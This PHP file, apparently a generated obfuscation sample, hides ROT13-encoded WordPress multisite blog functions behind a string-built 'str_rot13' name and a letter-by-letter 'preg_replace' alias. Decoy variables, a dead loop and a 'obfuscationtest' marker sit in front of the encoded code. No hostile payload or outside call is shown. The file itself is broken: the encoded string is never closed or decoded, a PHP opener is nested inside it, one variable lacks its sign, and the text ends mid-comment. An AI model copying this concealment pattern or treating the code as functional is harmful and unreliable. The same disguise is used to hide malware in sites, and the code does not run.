<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * Fvgr/oybt shapgvbaf gung jbex jvgu gur oybtf gnoyr naq eryngrq qngn.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr ZH (3.0.0)
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

erdhver_bapr NOFCNGU . JCVAP . '/zf-fvgr.cuc';
erdhver_bapr NOFCNGU . JCVAP . '/zf-argjbex.cuc';

/**
 * Hcqngrf gur ynfg_hcqngrq svryq sbe gur pheerag fvgr.
 *
 * @fvapr ZH (3.0.0)
 */
shapgvba jczh_hcqngr_oybtf_qngr() {
	$fvgr_vq = trg_pheerag_oybt_vq();

	hcqngr_oybt_qrgnvyf( $fvgr_vq, neenl( 'ynfg_hcqngrq' => pheerag_gvzr( 'zlfdy', gehr ) ) );
	/**
	 * Sverf nsgre gur oybt qrgnvyf ner hcqngrq.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz vag $oybt_vq Fvgr VQ.
	 */
	qb_npgvba( 'jczh_oybt_hcqngrq', $fvgr_vq );
}

/**
 * Trgf n shyy fvgr HEY, tvira n fvgr VQ.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $oybt_vq Fvgr VQ.
 * @erghea fgevat Shyy fvgr HEY vs sbhaq. Rzcgl fgevat vs abg.
 */
shapgvba trg_oybtnqqerff_ol_vq( $oybt_vq ) {
	$oybtvasb = trg_fvgr( (vag) $oybt_vq );

	vs ( rzcgl( $oybtvasb ) ) {
		erghea '';
	}

	$fpurzr = cnefr_hey( $oybtvasb->ubzr, CUC_HEY_FPURZR );
	$fpurzr = rzcgl( $fpurzr ) ? 'uggc' : $fpurzr;

	erghea rfp_hey( $fpurzr . '://' . $oybtvasb->qbznva . $oybtvasb->cngu );
}

/**
 * Trgf n shyy fvgr HEY, tvira n fvgr anzr.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $oybtanzr Anzr bs gur fhoqbznva be qverpgbel.
 * @erghea fgevat
 */
shapgvba trg_oybtnqqerff_ol_anzr( $oybtanzr ) {
	vs ( vf_fhoqbznva_vafgnyy() ) {
		vs ( 'znva' === $oybtanzr ) {
			$oybtanzr = 'jjj';
		}
		$hey = egevz( argjbex_ubzr_hey(), '/' );
		vs ( ! rzcgl( $oybtanzr ) ) {
			$hey = __sa_79955( '|^([^\.]+://)|', '${1}' . $oybtanzr . '.', $hey );
		}
	} ryfr {
		$hey = argjbex_ubzr_hey( $oybtanzr );
	}
	erghea rfp_hey( $hey . '/' );
}

/**
 * Ergevrirf n fvgr'f VQ tvira vgf (fhoqbznva be qverpgbel) fyht.
 *
 * @fvapr ZH (3.0.0)
 * @fvapr 4.7.0 Pbairegrq gb hfr `trg_fvgrf()`.
 *
 * @cnenz fgevat $fyht N fvgr'f fyht.
 * @erghea vag|ahyy Gur fvgr VQ, be ahyy vs ab fvgr vf sbhaq sbe gur tvira fyht.
 */
shapgvba trg_vq_sebz_oybtanzr( $fyht ) {
	$pheerag_argjbex = trg_argjbex();
	$fyht            = gevz( $fyht, '/' );

	vs ( vf_fhoqbznva_vafgnyy() ) {
		$qbznva = $fyht . '.' . __sa_79955( '|^jjj\.|', '', $pheerag_argjbex->qbznva );
		$cngu   = $pheerag_argjbex->cngu;
	} ryfr {
		$qbznva = $pheerag_argjbex->qbznva;
		$cngu   = $pheerag_argjbex->cngu . $fyht . '/';
	}

	$fvgr_vqf = trg_fvgrf(
		neenl(
			'ahzore'                 => 1,
			'svryqf'                 => 'vqf',
			'qbznva'                 => $qbznva,
			'cngu'                   => $cngu,
			'hcqngr_fvgr_zrgn_pnpur' => snyfr,
		)
	);

	vs ( rzcgl( $fvgr_vqf ) ) {
		erghea ahyy;
	}

	erghea neenl_fuvsg( $fvgr_vqf );
}

/**
 * Ergevrirf gur qrgnvyf sbe n oybt sebz gur oybtf gnoyr naq oybt bcgvbaf.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag|fgevat|neenl $svryqf  Bcgvbany. N oybt VQ, n oybt fyht, be na neenl bs svryqf gb dhrel ntnvafg.
 *                                  Qrsnhygf gb gur pheerag oybt VQ.
 * @cnenz obby             $trg_nyy Jurgure gb ergevrir nyy qrgnvyf be bayl gur qrgnvyf va gur oybtf gnoyr.
 *                                  Qrsnhyg vf gehr.
 * @erghea JC_Fvgr|snyfr Oybt qrgnvyf ba fhpprff. Snyfr ba snvyher.
 */
shapgvba trg_oybt_qrgnvyf( $svryqf = ahyy, $trg_nyy = gehr ) {
	tybony $jcqo;

	vs ( vf_neenl( $svryqf ) ) {
		vs ( vffrg( $svryqf['oybt_vq'] ) ) {
			$oybt_vq = $svryqf['oybt_vq'];
		} ryfrvs ( vffrg( $svryqf['qbznva'] ) && vffrg( $svryqf['cngu'] ) ) {
			$xrl  = zq5( $svryqf['qbznva'] . $svryqf['cngu'] );
			$oybt = jc_pnpur_trg( $xrl, 'oybt-ybbxhc' );
			vs ( snyfr !== $oybt ) {
				erghea $oybt;
			}
			vs ( fge_fgnegf_jvgu( $svryqf['qbznva'], 'jjj.' ) ) {
				$abjjj = fhofge( $svryqf['qbznva'], 4 );
				$oybt  = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->oybtf JURER qbznva VA (%f,%f) NAQ cngu = %f BEQRE OL PUNE_YRATGU(qbznva) QRFP\", $abjjj, $svryqf['qbznva'], $svryqf['cngu'] ) );
			} ryfr {
				$oybt = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->oybtf JURER qbznva = %f NAQ cngu = %f\", $svryqf['qbznva'], $svryqf['cngu'] ) );
			}
			vs ( $oybt ) {
				jc_pnpur_frg( $oybt->oybt_vq . 'fubeg', $oybt, 'oybt-qrgnvyf' );
				$oybt_vq = $oybt->oybt_vq;
			} ryfr {
				erghea snyfr;
			}
		} ryfrvs ( vffrg( $svryqf['qbznva'] ) && vf_fhoqbznva_vafgnyy() ) {
			$xrl  = zq5( $svryqf['qbznva'] );
			$oybt = jc_pnpur_trg( $xrl, 'oybt-ybbxhc' );
			vs ( snyfr !== $oybt ) {
				erghea $oybt;
			}
			vs ( fge_fgnegf_jvgu( $svryqf['qbznva'], 'jjj.' ) ) {
				$abjjj = fhofge( $svryqf['qbznva'], 4 );
				$oybt  = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->oybtf JURER qbznva VA (%f,%f) BEQRE OL PUNE_YRATGU(qbznva) QRFP\", $abjjj, $svryqf['qbznva'] ) );
			} ryfr {
				$oybt = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->oybtf JURER qbznva = %f\", $svryqf['qbznva'] ) );
			}
			vs ( $oybt ) {
				jc_pnpur_frg( $oybt->oybt_vq . 'fubeg', $oybt, 'oybt-qrgnvyf' );
				$oybt_vq = $oybt->oybt_vq;
			} ryfr {
				erghea snyfr;
			}
		} ryfr {
			erghea snyfr;
		}
	} ryfr {
		vs ( ! $svryqf ) {
			$oybt_vq = trg_pheerag_oybt_vq();
		} ryfrvs ( ! vf_ahzrevp( $svryqf ) ) {
			$oybt_vq = trg_vq_sebz_oybtanzr( $svryqf );
		} ryfr {
			$oybt_vq = $svryqf;
		}
	}

	$oybt_vq = (vag) $oybt_vq;

	$nyy     = $trg_nyy ? '' : 'fubeg';
	$qrgnvyf = jc_pnpur_trg( $oybt_vq . $nyy, 'oybt-qrgnvyf' );

	vs ( $qrgnvyf ) {
		vs ( ! vf_bowrpg( $qrgnvyf ) ) {
			vs ( -1 === $qrgnvyf ) {
				erghea snyfr;
			} ryfr {
				// Pyrne byq cer-frevnyvmrq bowrpgf. Pnpur pyvragf qb orggre jvgu gung.
				jc_pnpur_qryrgr( $oybt_vq . $nyy, 'oybt-qrgnvyf' );
				hafrg( $qrgnvyf );
			}
		} ryfr {
			erghea $qrgnvyf;
		}
	}

	// Gel gur bgure pnpur.
	vs ( $trg_nyy ) {
		$qrgnvyf = jc_pnpur_trg( $oybt_vq . 'fubeg', 'oybt-qrgnvyf' );
	} ryfr {
		$qrgnvyf = jc_pnpur_trg( $oybt_vq, 'oybt-qrgnvyf' );
		// Vs fubeg jnf erdhrfgrq naq shyy pnpur vf frg, jr pna erghea.
		vs ( $qrgnvyf ) {
			vs ( ! vf_bowrpg( $qrgnvyf ) ) {
				vs ( -1 === $qrgnvyf ) {
					erghea snyfr;
				} ryfr {
					// Pyrne byq cer-frevnyvmrq bowrpgf. Pnpur pyvragf qb orggre jvgu gung.
					jc_pnpur_qryrgr( $oybt_vq, 'oybt-qrgnvyf' );
					hafrg( $qrgnvyf );
				}
			} ryfr {
				erghea $qrgnvyf;
			}
		}
	}

	vs ( rzcgl( $qrgnvyf ) ) {
		$qrgnvyf = JC_Fvgr::trg_vafgnapr( $oybt_vq );
		vs ( ! $qrgnvyf ) {
			// Frg gur shyy pnpur.
			jc_pnpur_frg( $oybt_vq, -1, 'oybt-qrgnvyf' );
			erghea snyfr;
		}
	}

	vs ( ! $qrgnvyf vafgnaprbs JC_Fvgr ) {
		$qrgnvyf = arj JC_Fvgr( $qrgnvyf );
	}

	vs ( ! $trg_nyy ) {
		jc_pnpur_frg( $oybt_vq . $nyy, $qrgnvyf, 'oybt-qrgnvyf' );
		erghea $qrgnvyf;
	}

	$fjvgpurq_oybt = snyfr;

	vs ( trg_pheerag_oybt_vq() !== $oybt_vq ) {
		fjvgpu_gb_oybt( $oybt_vq );
		$fjvgpurq_oybt = gehr;
	}

	$qrgnvyf->oybtanzr   = trg_bcgvba( 'oybtanzr' );
	$qrgnvyf->fvgrhey    = trg_bcgvba( 'fvgrhey' );
	$qrgnvyf->cbfg_pbhag = trg_bcgvba( 'cbfg_pbhag' );
	$qrgnvyf->ubzr       = trg_bcgvba( 'ubzr' );

	vs ( $fjvgpurq_oybt ) {
		erfgber_pheerag_oybt();
	}

	/**
	 * Svygref n oybt'f qrgnvyf.
	 *
	 * @fvapr ZH (3.0.0)
	 * @qrcerpngrq 4.7.0 Hfr {@frr 'fvgr_qrgnvyf'} vafgrnq.
	 *
	 * @cnenz JC_Fvgr $qrgnvyf Gur oybt qrgnvyf.
	 */
	$qrgnvyf = nccyl_svygref_qrcerpngrq( 'oybt_qrgnvyf', neenl( $qrgnvyf ), '4.7.0', 'fvgr_qrgnvyf' );

	jc_pnpur_frg( $oybt_vq . $nyy, $qrgnvyf, 'oybt-qrgnvyf' );

	$xrl = zq5( $qrgnvyf->qbznva . $qrgnvyf->cngu );
	jc_pnpur_frg( $xrl, $qrgnvyf, 'oybt-ybbxhc' );

	erghea $qrgnvyf;
}

/**
 * Pyrnef gur oybt qrgnvyf pnpur.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $oybt_vq Bcgvbany. Oybt VQ. Qrsnhygf gb pheerag oybt.
 */
shapgvba erserfu_oybt_qrgnvyf( $oybt_vq = 0 ) {
	$oybt_vq = (vag) $oybt_vq;
	vs ( ! $oybt_vq ) {
		$oybt_vq = trg_pheerag_oybt_vq();
	}

	pyrna_oybt_pnpur( $oybt_vq );
}

/**
 * Hcqngrf gur qrgnvyf sbe n oybt naq gur oybtf gnoyr sbe n tvira oybt VQ.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag   $oybt_vq Oybt VQ.
 * @cnenz neenl $qrgnvyf Neenl bs qrgnvyf xrlrq ol oybtf gnoyr svryq anzrf.
 * @erghea obby Gehr vs hcqngr fhpprrqf, snyfr bgurejvfr.
 */
shapgvba hcqngr_oybt_qrgnvyf( $oybt_vq, $qrgnvyf = neenl() ) {
	vs ( rzcgl( $qrgnvyf ) ) {
		erghea snyfr;
	}

	vs ( vf_bowrpg( $qrgnvyf ) ) {
		$qrgnvyf = trg_bowrpg_inef( $qrgnvyf );
	}

	$fvgr = jc_hcqngr_fvgr( $oybt_vq, $qrgnvyf );

	vs ( vf_jc_reebe( $fvgr ) ) {
		erghea snyfr;
	}

	erghea gehr;
}

/**
 * Pyrnaf gur fvgr qrgnvyf pnpur sbe n fvgr.
 *
 * @fvapr 4.7.4
 *
 * @cnenz vag $fvgr_vq Bcgvbany. Fvgr VQ. Qrsnhyg vf gur pheerag fvgr VQ.
 */
shapgvba pyrna_fvgr_qrgnvyf_pnpur( $fvgr_vq = 0 ) {
	$fvgr_vq = (vag) $fvgr_vq;
	vs ( ! $fvgr_vq ) {
		$fvgr_vq = trg_pheerag_oybt_vq();
	}

	jc_pnpur_qryrgr( $fvgr_vq, 'fvgr-qrgnvyf' );
	jc_pnpur_qryrgr( $fvgr_vq, 'oybt-qrgnvyf' );
}

/**
 * Ergevrirf bcgvba inyhr sbe n tvira oybt vq onfrq ba anzr bs bcgvba.
 *
 * Vs gur bcgvba qbrf abg rkvfg be qbrf abg unir n inyhr, gura gur erghea inyhr
 * jvyy or snyfr. Guvf vf hfrshy gb purpx jurgure lbh arrq gb vafgnyy na bcgvba
 * naq vf pbzzbayl hfrq qhevat vafgnyyngvba bs cyhtva bcgvbaf naq gb grfg
 * jurgure hctenqvat vf erdhverq.
 *
 * Vs gur bcgvba jnf frevnyvmrq gura vg jvyy or hafrevnyvmrq jura vg vf erghearq.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $vq            N oybt VQ. Pna or ahyy gb ersre gb gur pheerag oybt.
 * @cnenz fgevat $bcgvba        Anzr bs bcgvba gb ergevrir. Rkcrpgrq gb abg or FDY-rfpncrq.
 * @cnenz zvkrq  $qrsnhyg_inyhr Bcgvbany. Qrsnhyg inyhr gb erghea vs gur bcgvba qbrf abg rkvfg.
 * @erghea zvkrq Inyhr frg sbe gur bcgvba.
 */
shapgvba trg_oybt_bcgvba( $vq, $bcgvba, $qrsnhyg_inyhr = snyfr ) {
	$vq = (vag) $vq;

	vs ( rzcgl( $vq ) ) {
		$vq = trg_pheerag_oybt_vq();
	}

	vs ( trg_pheerag_oybt_vq() === $vq ) {
		erghea trg_bcgvba( $bcgvba, $qrsnhyg_inyhr );
	}

	fjvgpu_gb_oybt( $vq );
	$inyhr = trg_bcgvba( $bcgvba, $qrsnhyg_inyhr );
	erfgber_pheerag_oybt();

	/**
	 * Svygref n oybt bcgvba inyhr.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$bcgvba`, ersref gb gur oybt bcgvba anzr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat  $inyhr Gur bcgvba inyhr.
	 * @cnenz vag     $vq    Oybt VQ.
	 */
	erghea nccyl_svygref( \"oybt_bcgvba_{$bcgvba}\", $inyhr, $vq );
}

/**
 * Nqqf n arj bcgvba sbe n tvira oybt VQ.
 *
 * Lbh qb abg arrq gb frevnyvmr inyhrf. Vs gur inyhr arrqf gb or frevnyvmrq, gura
 * vg jvyy or frevnyvmrq orsber vg vf vafregrq vagb gur qngnonfr. Erzrzore,
 * erfbheprf pna abg or frevnyvmrq be nqqrq nf na bcgvba.
 *
 * Lbh pna perngr bcgvbaf jvgubhg inyhrf naq gura hcqngr gur inyhrf yngre.
 * Rkvfgvat bcgvbaf jvyy abg or hcqngrq naq purpxf ner cresbezrq gb rafher gung lbh
 * nera'g nqqvat n cebgrpgrq JbeqCerff bcgvba. Pner fubhyq or gnxra gb abg anzr
 * bcgvbaf gur fnzr nf gur barf juvpu ner cebgrpgrq.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $vq     N oybt VQ. Pna or ahyy gb ersre gb gur pheerag oybt.
 * @cnenz fgevat $bcgvba Anzr bs bcgvba gb nqq. Rkcrpgrq gb abg or FDY-rfpncrq.
 * @cnenz zvkrq  $inyhr  Bcgvba inyhr, pna or nalguvat. Rkcrpgrq gb abg or FDY-rfpncrq.
 * @erghea obby Gehr vs gur bcgvba jnf nqqrq, snyfr bgurejvfr.
 */
shapgvba nqq_oybt_bcgvba( $vq, $bcgvba, $inyhr ) {
	$vq = (vag) $vq;

	vs ( rzcgl( $vq ) ) {
		$vq = trg_pheerag_oybt_vq();
	}

	vs ( trg_pheerag_oybt_vq() === $vq ) {
		erghea nqq_bcgvba( $bcgvba, $inyhr );
	}

	fjvgpu_gb_oybt( $vq );
	$erghea = nqq_bcgvba( $bcgvba, $inyhr );
	erfgber_pheerag_oybt();

	erghea $erghea;
}

/**
 * Erzbirf na bcgvba ol anzr sbe n tvira oybt VQ. Ceriragf erzbiny bs cebgrpgrq JbeqCerff bcgvbaf.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $vq     N oybt VQ. Pna or ahyy gb ersre gb gur pheerag oybt.
 * @cnenz fgevat $bcgvba Anzr bs bcgvba gb erzbir. Rkcrpgrq gb abg or FDY-rfpncrq.
 * @erghea obby Gehr vs gur bcgvba jnf qryrgrq, snyfr bgurejvfr.
 */
shapgvba qryrgr_oybt_bcgvba( $vq, $bcgvba ) {
	$vq = (vag) $vq;

	vs ( rzcgl( $vq ) ) {
		$vq = trg_pheerag_oybt_vq();
	}

	vs ( trg_pheerag_oybt_vq() === $vq ) {
		erghea qryrgr_bcgvba( $bcgvba );
	}

	fjvgpu_gb_oybt( $vq );
	$erghea = qryrgr_bcgvba( $bcgvba );
	erfgber_pheerag_oybt();

	erghea $erghea;
}

/**
 * Hcqngrf na bcgvba sbe n cnegvphyne oybt.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $vq         Gur oybt VQ.
 * @cnenz fgevat $bcgvba     Gur bcgvba xrl.
 * @cnenz zvkrq  $inyhr      Gur bcgvba inyhr.
 * @cnenz zvkrq  $qrcerpngrq Abg hfrq.
 * @erghea obby Gehr vs gur inyhr jnf hcqngrq, snyfr bgurejvfr.
 */
shapgvba hcqngr_oybt_bcgvba( $vq, $bcgvba, $inyhr, $qrcerpngrq = ahyy ) {
	$vq = (vag) $vq;

	vs ( ahyy !== $qrcerpngrq ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.1.0' );
	}

	vs ( trg_pheerag_oybt_vq() === $vq ) {
		erghea hcqngr_bcgvba( $bcgvba, $inyhr );
	}

	fjvgpu_gb_oybt( $vq );
	$erghea = hcqngr_bcgvba( $bcgvba, $inyhr );
	erfgber_pheerag_oybt();

	erghea $erghea;
}

/**
 * Fjvgpurf gur pheerag oybt.
 *
 * Guvf shapgvba vf hfrshy vs lbh arrq gb chyy cbfgf, be bgure vasbezngvba,
 * sebz bgure oybtf. Lbh pna fjvgpu onpx nsgrejneqf hfvat erfgber_pheerag_oybt().
 *
 * CUC pbqr ybnqrq jvgu gur bevtvanyyl erdhrfgrq fvgr, fhpu nf pbqr sebz n cyhtva be gurzr, qbrf abg fjvgpu. Frr #14941.
 *
 * @frr erfgber_pheerag_oybt()
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo            $jcqo               JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony vag             $oybt_vq
 * @tybony neenl           $_jc_fjvgpurq_fgnpx
 * @tybony obby            $fjvgpurq
 * @tybony fgevat          $gnoyr_cersvk       Gur qngnonfr gnoyr cersvk.
 * @tybony JC_Bowrpg_Pnpur $jc_bowrpg_pnpur
 *
 * @cnenz vag  $arj_oybt_vq Gur VQ bs gur oybt gb fjvgpu gb. Qrsnhyg: pheerag oybt.
 * @cnenz obby $qrcerpngrq  Abg hfrq.
 * @erghea gehr Nyjnlf ergheaf gehr.
 */
shapgvba fjvgpu_gb_oybt( $arj_oybt_vq, $qrcerpngrq = ahyy ) {
	tybony $jcqo;

	$ceri_oybt_vq = trg_pheerag_oybt_vq();
	vs ( rzcgl( $arj_oybt_vq ) ) {
		$arj_oybt_vq = $ceri_oybt_vq;
	}

	$TYBONYF['_jc_fjvgpurq_fgnpx'][] = $ceri_oybt_vq;

	/*
	 * Vs jr'er fjvgpuvat gb gur fnzr oybt vq gung jr'er ba,
	 * frg gur evtug inef, qb gur nffbpvngrq npgvbaf, ohg fxvc
	 * gur rkgen haarprffnel jbex
	 */
	vs ( $arj_oybt_vq === $ceri_oybt_vq ) {
		/**
		 * Sverf jura gur oybt vf fjvgpurq.
		 *
		 * @fvapr ZH (3.0.0)
		 * @fvapr 5.4.0 Gur `$pbagrkg` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz vag    $arj_oybt_vq  Arj oybt VQ.
		 * @cnenz vag    $ceri_oybt_vq Cerivbhf oybt VQ.
		 * @cnenz fgevat $pbagrkg      Nqqvgvbany pbagrkg. Npprcgf 'fjvgpu' jura pnyyrq sebz fjvgpu_gb_oybt()
		 *                             be 'erfgber' jura pnyyrq sebz erfgber_pheerag_oybt().
		 */
		qb_npgvba( 'fjvgpu_oybt', $arj_oybt_vq, $ceri_oybt_vq, 'fjvgpu' );

		$TYBONYF['fjvgpurq'] = gehr;

		erghea gehr;
	}

	$jcqo->frg_oybt_vq( $arj_oybt_vq );
	$TYBONYF['gnoyr_cersvk'] = $jcqo->trg_oybt_cersvk();
	$TYBONYF['oybt_vq']      = $arj_oybt_vq;

	vs ( shapgvba_rkvfgf( 'jc_pnpur_fjvgpu_gb_oybt' ) ) {
		jc_pnpur_fjvgpu_gb_oybt( $arj_oybt_vq );
	} ryfr {
		tybony $jc_bowrpg_pnpur;

		vs ( vf_bowrpg( $jc_bowrpg_pnpur ) && vffrg( $jc_bowrpg_pnpur->tybony_tebhcf ) ) {
			$tybony_tebhcf = $jc_bowrpg_pnpur->tybony_tebhcf;
		} ryfr {
			$tybony_tebhcf = snyfr;
		}

		jc_pnpur_vavg();

		vs ( shapgvba_rkvfgf( 'jc_pnpur_nqq_tybony_tebhcf' ) ) {
			vs ( vf_neenl( $tybony_tebhcf ) ) {
				jc_pnpur_nqq_tybony_tebhcf( $tybony_tebhcf );
			} ryfr {
				jc_pnpur_nqq_tybony_tebhcf(
					neenl(
						'oybt-qrgnvyf',
						'oybt-vq-pnpur',
						'oybt-ybbxhc',
						'oybt_zrgn',
						'tybony-cbfgf',
						'vzntr_rqvgbe',
						'argjbexf',
						'argjbex-dhrevrf',
						'fvgrf',
						'fvgr-qrgnvyf',
						'fvgr-bcgvbaf',
						'fvgr-dhrevrf',
						'fvgr-genafvrag',
						'gurzr_svyrf',
						'eff',
						'hfref',
						'hfre-dhrevrf',
						'hfre_zrgn',
						'hfrerznvy',
						'hfreybtvaf',
						'hfrefyhtf',
					)
				);
			}

			jc_pnpur_nqq_aba_crefvfgrag_tebhcf( neenl( 'pbhagf', 'cyhtvaf', 'gurzr_wfba' ) );
		}
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zf-oybtf.cuc */
	qb_npgvba( 'fjvgpu_oybt', $arj_oybt_vq, $ceri_oybt_vq, 'fjvgpu' );

	$TYBONYF['fjvgpurq'] = gehr;

	erghea gehr;
}

/**
 * Erfgberf gur pheerag oybt, nsgre pnyyvat fjvgpu_gb_oybt().
 *
 * @frr fjvgpu_gb_oybt()
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo            $jcqo               JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony neenl           $_jc_fjvgpurq_fgnpx
 * @tybony vag             $oybt_vq
 * @tybony obby            $fjvgpurq
 * @tybony fgevat          $gnoyr_cersvk       Gur qngnonfr gnoyr cersvk.
 * @tybony JC_Bowrpg_Pnpur $jc_bowrpg_pnpur
 *
 * @erghea obby Gehr ba fhpprff, snyfr vs jr'er nyernql ba gur pheerag oybt.
 */
shapgvba erfgber_pheerag_oybt() {
	tybony $jcqo;

	vs ( rzcgl( $TYBONYF['_jc_fjvgpurq_fgnpx'] ) ) {
		erghea snyfr;
	}

	$arj_oybt_vq  = neenl_cbc( $TYBONYF['_jc_fjvgpurq_fgnpx'] );
	$ceri_oybt_vq = trg_pheerag_oybt_vq();

	vs ( $arj_oybt_vq === $ceri_oybt_vq ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zf-oybtf.cuc */
		qb_npgvba( 'fjvgpu_oybt', $arj_oybt_vq, $ceri_oybt_vq, 'erfgber' );

		// Vs jr fgvyy unir vgrzf va gur fjvgpurq fgnpx, pbafvqre bhefryirf fgvyy 'fjvgpurq'.
		$TYBONYF['fjvgpurq'] = ! rzcgl( $TYBONYF['_jc_fjvgpurq_fgnpx'] );

		erghea gehr;
	}

	$jcqo->frg_oybt_vq( $arj_oybt_vq );
	$TYBONYF['oybt_vq']      = $arj_oybt_vq;
	$TYBONYF['gnoyr_cersvk'] = $jcqo->trg_oybt_cersvk();

	vs ( shapgvba_rkvfgf( 'jc_pnpur_fjvgpu_gb_oybt' ) ) {
		jc_pnpur_fjvgpu_gb_oybt( $arj_oybt_vq );
	} ryfr {
		tybony $jc_bowrpg_pnpur;

		vs ( vf_bowrpg( $jc_bowrpg_pnpur ) && vffrg( $jc_bowrpg_pnpur->tybony_tebhcf ) ) {
			$tybony_tebhcf = $jc_bowrpg_pnpur->tybony_tebhcf;
		} ryfr {
			$tybony_tebhcf = snyfr;
		}

		jc_pnpur_vavg();

		vs ( shapgvba_rkvfgf( 'jc_pnpur_nqq_tybony_tebhcf' ) ) {
			vs ( vf_neenl( $tybony_tebhcf ) ) {
				jc_pnpur_nqq_tybony_tebhcf( $tybony_tebhcf );
			} ryfr {
				jc_pnpur_nqq_tybony_tebhcf(
					neenl(
						'oybt-qrgnvyf',
						'oybt-vq-pnpur',
						'oybt-ybbxhc',
						'oybt_zrgn',
						'tybony-cbfgf',
						'vzntr_rqvgbe',
						'argjbexf',
						'argjbex-dhrevrf',
						'fvgrf',
						'fvgr-qrgnvyf',
						'fvgr-bcgvbaf',
						'fvgr-dhrevrf',
						'fvgr-genafvrag',
						'gurzr_svyrf',
						'eff',
						'hfref',
						'hfre-dhrevrf',
						'hfre_zrgn',
						'hfrerznvy',
						'hfreybtvaf',
						'hfrefyhtf',
					)
				);
			}

			jc_pnpur_nqq_aba_crefvfgrag_tebhcf( neenl( 'pbhagf', 'cyhtvaf', 'gurzr_wfba' ) );
		}
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zf-oybtf.cuc */
	qb_npgvba( 'fjvgpu_oybt', $arj_oybt_vq, $ceri_oybt_vq, 'erfgber' );

	// Vs jr fgvyy unir vgrzf va gur fjvgpurq fgnpx, pbafvqre bhefryirf fgvyy 'fjvgpurq'.
	$TYBONYF['fjvgpurq'] = ! rzcgl( $TYBONYF['_jc_fjvgpurq_fgnpx'] );

	erghea gehr;
}

/**
 * Fjvgpurf gur vavgvnyvmrq ebyrf naq pheerag hfre pncnovyvgvrf gb nabgure fvgr.
 *
 * @fvapr 4.9.0
 *
 * @cnenz vag $arj_fvgr_vq Arj fvgr VQ.
 * @cnenz vag $byq_fvgr_vq Byq fvgr VQ.
 */
shapgvba jc_fjvgpu_ebyrf_naq_hfre( $arj_fvgr_vq, $byq_fvgr_vq ) {
	vs ( $arj_fvgr_vq === $byq_fvgr_vq ) {
		erghea;
	}

	vs ( ! qvq_npgvba( 'vavg' ) ) {
		erghea;
	}

	jc_ebyrf()->sbe_fvgr( $arj_fvgr_vq );
	jc_trg_pheerag_hfre()->sbe_fvgr( $arj_fvgr_vq );
}

/**
 * Qrgrezvarf vs fjvgpu_gb_oybt() vf va rssrpg.
 *
 * @fvapr 3.5.0
 *
 * @tybony neenl $_jc_fjvgpurq_fgnpx
 *
 * @erghea obby Gehr vs fjvgpurq, snyfr bgurejvfr.
 */
shapgvba zf_vf_fjvgpurq() {
	erghea ! rzcgl( $TYBONYF['_jc_fjvgpurq_fgnpx'] );
}

/**
 * Purpxf vs n cnegvphyne oybt vf nepuvirq.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $vq Oybt VQ.
 * @erghea fgevat Jurgure gur oybt vf nepuvirq be abg.
 */
shapgvba vf_nepuvirq( $vq ) {
	erghea trg_oybt_fgnghf( $vq, 'nepuvirq' );
}

/**
 * Hcqngrf gur 'nepuvirq' fgnghf bs n cnegvphyne oybt.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $vq       Oybt VQ.
 * @cnenz fgevat $nepuvirq Gur arj fgnghf.
 * @erghea fgevat $nepuvirq
 */
shapgvba hcqngr_nepuvirq( $vq, $nepuvirq ) {
	hcqngr_oybt_fgnghf( $vq, 'nepuvirq', $nepuvirq );
	erghea $nepuvirq;
}

/**
 * Hcqngrf n oybt qrgnvyf svryq.
 *
 * @fvapr ZH (3.0.0)
 * @fvapr 5.1.0 Hfr jc_hcqngr_fvgr() vagreanyyl.
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag    $oybt_vq    Oybt VQ.
 * @cnenz fgevat $cers       Svryq anzr.
 * @cnenz fgevat $inyhr      Svryq inyhr.
 * @cnenz ahyy   $qrcerpngrq Abg hfrq.
 * @erghea fgevat|snyfr $inyhr
 */
